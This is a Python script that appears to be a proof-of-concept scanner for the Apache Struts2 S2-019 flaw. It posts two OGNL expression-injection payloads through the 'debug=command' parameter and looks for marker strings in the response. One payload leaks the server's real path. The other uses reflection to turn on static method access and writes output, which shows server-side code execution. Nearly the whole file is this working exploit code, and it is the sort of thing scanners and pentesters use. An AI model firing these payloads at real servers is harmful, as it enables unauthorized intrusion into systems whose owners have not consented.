import warnings
import requests

warnings.filterwarnings("ignore")


def poc(url):
    timeout = 10
    proxies = {'http': '127.0.0.1:9999'}
    check = ['\Struts2-vuln-Goop', '/Struts2-vuln-Goop', '-Struts2-vuln-Goop', 'Unable to initialize device PRN']

    poc_goop = [
        r'''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath("Struts2-vuln-Goop"),#matt=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C#matt.getWriter().println(#c),#matt.getWriter().flush(),#matt.getWriter().close()''',
        r'''debug=command&expression=%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.println%28%27-Struts2-vuln%27%2b%27-Goop%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29'''
    ]
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        for test in poc_goop:
            req = requests.post(url, data=test, headers=headers, timeout=timeout, verify=False, )
            result = "目标存在 Struts2-019, check url: %s" % url
            for c in check:
                if str(c) in req.text:
                    return result
    except:
        pass
